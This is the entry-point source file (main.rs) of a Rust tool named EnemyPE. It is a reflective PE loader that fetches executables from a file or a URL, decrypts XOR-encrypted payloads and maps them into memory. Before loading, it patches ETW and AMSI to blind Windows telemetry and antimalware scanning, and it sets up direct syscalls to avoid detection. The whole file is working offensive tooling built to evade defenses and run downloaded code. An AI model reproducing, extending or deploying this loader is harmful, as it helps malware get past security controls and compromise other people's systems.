//main.rs
//Author: wanmywann

#![allow(non_snake_case)]

mod loader;
mod logger;
mod pe_structures;
mod crypto;
mod evasion;
mod syscall;

use loader::{X64PeLoader, X86PeLoader};
use logger::{log_error, log_info, log_ok};
use std::env;
use std::fs;

use crate::loader::load_x64;
use crate::loader::load_x86;

const BANNER: &str = r#"
╭─╴╭╮╷╭─╴╭┬╮╷ ╷╭─╮╭─╴
├╴ │╰┤├╴ │││╰┬╯├─╯├╴ 
╰─╴╵ ╵╰─╴╵ ╵ ╵ ╵  ╰─╴
author : wanmywanny
"#;

const USAGE: &str = r#"Usage:
  EnemyPE.exe --x86 <file|url>    Load x86 PE
  EnemyPE.exe --x64 <file|url>    Load x64 PE
  EnemyPE.exe --encrypt <file>    XOR-encrypt payload
  EnemyPE.exe --coffee            Easter egg
"#;

const COFFEE: &str = r#"
    (  )   (   )  )
     ) (   )  (  (
     ( )  (    ) )
     _____________
    <_____________> ___
    |             |/ _ \
    |               | |
    |               |_| |
 ___|             |\___/
/    \___________/    \
\_____________________/
"#;

fn main() {
    #[cfg(windows)]
    {
        use windows::Win32::System::Console::{
            GetConsoleMode, GetStdHandle, SetConsoleMode,
            ENABLE_VIRTUAL_TERMINAL_PROCESSING, STD_OUTPUT_HANDLE,
        };
        unsafe {
            let handle = GetStdHandle(STD_OUTPUT_HANDLE).unwrap();
            let mut mode = windows::Win32::System::Console::CONSOLE_MODE(0);
            let _ = GetConsoleMode(handle, &mut mode);
            let _ = SetConsoleMode(handle, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
        }
    }

    println!("{}", BANNER);

    let arch = if cfg!(target_pointer_width = "64") {
        "x64"
    } else {
        "x86"
    };
    log_info(&format!("Process arch: {}", arch));

    // Early evasion — disable telemetry before any loader activity
    evasion::patch_etw();
    evasion::patch_amsi();

    // Resolve syscall numbers
    syscall::init_syscalls();
    log_ok("Syscall stub resolved");

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        println!("{}", USAGE);
        return;
    }

    if let Err(e) = run(&args) {
        log_error(&e);
    }
}

fn run(args: &[String]) -> Result<(), String> {
    match args[1].as_str() {
        "--coffee" => {
            println!("{}", COFFEE);
            Ok(())
        }

        "--encrypt" => {
            if args.len() < 3 {
                return Err("Usage: EnemyPE.exe --encrypt <file>".to_string());
            }
            let path = &args[2];
            crypto::encrypt_file(path)?;
            log_ok(&format!("Encrypted -> {}.enc", path));
            Ok(())
        }

        "--x86" => {
            if cfg!(target_pointer_width = "64") {
                return Err(
                    "Current process is x64, cannot load x86 PE from a 64-bit process.".to_string(),
                );
            }

            let path = &args[2];
            let bytes = read_file(path)?;
            let bytes = crypto::decrypt_if_needed(bytes);

            let pe = X86PeLoader::new(bytes)?;
            if !pe.is_32bit() {
                return Err("Not an x86 (PE32) file.".to_string());
            }

            let image_base = pe.optional_header.image_base;
            log_ok(&format!("Image base: {:#X}", image_base));

            load_x86(&pe)
        }

        "--x64" => {
            if cfg!(target_pointer_width = "32") {
                return Err(
                    "Current process is x86, cannot load x64 PE from a 32-bit process.".to_string(),
                );
            }

            let path = &args[2];
            let bytes = read_file(path)?;
            let bytes = crypto::decrypt_if_needed(bytes);

            let pe = X64PeLoader::new(bytes)?;
            if pe.is_32bit_header() {
                return Err("Not an x64 PE file.".to_string());
            }

            let image_base = pe.optional_header64.image_base;
            log_ok(&format!("Image base: {:#X}", image_base));

            load_x64(&pe)
        }

        other => Err(format!("Unknown command: {}", other)),
    }
}

fn read_file(path: &str) -> Result<Vec<u8>, String> {
    if path.starts_with("http://") || path.starts_with("https://") {
        log_ok(&format!("Fetching: {}", path));

        let mut reader = ureq::get(path)
            .call()
            .map_err(|e| format!("HTTP request failed: {}", e))?
            .into_reader();

        let mut bytes = Vec::new();
        reader
            .read_to_end(&mut bytes)
            .map_err(|e| format!("Failed to read response: {}", e))?;

        log_ok(&format!("Downloaded {} bytes", bytes.len()));
        Ok(bytes)
    } else {
        if !std::path::Path::new(path).exists() {
            return Err(format!("File not found: {}", path));
        }
        let bytes = fs::read(path).map_err(|e| format!("Failed to read file: {}", e))?;
        log_ok(&format!("Read {} bytes", bytes.len()));
        Ok(bytes)
    }
}
